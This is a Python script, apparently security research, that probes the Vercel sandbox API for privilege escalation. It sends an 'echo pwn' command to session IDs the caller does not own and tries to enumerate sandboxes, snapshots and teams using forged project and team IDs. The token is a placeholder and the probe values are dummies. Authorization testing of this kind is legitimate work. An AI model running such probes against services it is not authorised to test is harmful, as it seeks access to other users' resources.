# 实验J105: cmd 接口 sessionId 归属校验 + project 参数越权枚举 — 完整越权链验证
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

# 拿自己的 sessionId 对照
c, r = api("GET", f"/v2/sandboxes?teamId={TEAM}&project={PROJ}")
sbx = json.loads(r)["sandboxes"]
own_sid = next((s["currentSessionId"] for s in sbx if s.get("currentSessionId")), None)
print("own session:", own_sid, flush=True)

CMD = {"command": "echo", "args": ["pwn"], "wait": False, "logs": False, "timeout": 100}

print("\n== [A] cmd 归属校验 (合法参数) ==", flush=True)
for label, sid in [("own", own_sid),
                   ("fake-format", "sbx_zzzzzzzzzzzzzzzzzzzzzzzzzzzz"),
                   ("fake-27ch", "sbx_zzzzzzzzzzzzzzzzzzzzzzzzz"),
                   ("empty", "")]:
    if not sid:
        continue
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", CMD)
    print(f"  [{label}] {c}: {r[:250]}", flush=True)
    time.sleep(0.4)

print("\n== [B] project 参数越权枚举 ==", flush=True)
for label, proj in [("fake-valid-format", "prj_zzzzzzzzzzzzzzzzzzzzzzzzzzzz"),
                    ("fake-27ch", "prj_zzzzzzzzzzzzzzzzzzzzzzzzz"),
                    ("nonexist", "prj_doesnotexist123"),
                    ("own", PROJ)]:
    c, r = api("GET", f"/v2/sandboxes?teamId={TEAM}&project={proj}")
    print(f"  sandboxes[{label}] {c}: {r[:250]}", flush=True)
    time.sleep(0.4)

print("\n== [C] snapshot 列表 project 越权 ==", flush=True)
for label, proj in [("fake-valid-format", "prj_zzzzzzzzzzzzzzzzzzzzzzzzzzzz"),
                    ("own", PROJ)]:
    c, r = api("GET", f"/v2/sandboxes/snapshots?teamId={TEAM}&project={proj}")
    print(f"  snapshots[{label}] {c}: {r[:250]}", flush=True)
    time.sleep(0.4)

print("\n== [D] teamId 越权 (陌生 team) ==", flush=True)
for label, team in [("fake-valid-format", "team_zzzzzzzzzzzzzzzzzzzzzzzzzzzz"),
                    ("own", TEAM)]:
    c, r = api("GET", f"/v2/sandboxes?teamId={team}&project={PROJ}")
    print(f"  sandboxes[team {label}] {c}: {r[:250]}", flush=True)
    time.sleep(0.4)

print("\n== [E] 陌生 team + 陌生 project 交叉 ==", flush=True)
c, r = api("GET", f"/v2/sandboxes?teamId=team_zzzzzzzzzzzzzzzzzzzzzzzzzzzz&project=prj_zzzzzzzzzzzzzzzzzzzzzzzzzzzz")
print(f"  {c}: {r[:250]}", flush=True)

print("\ndone", flush=True)
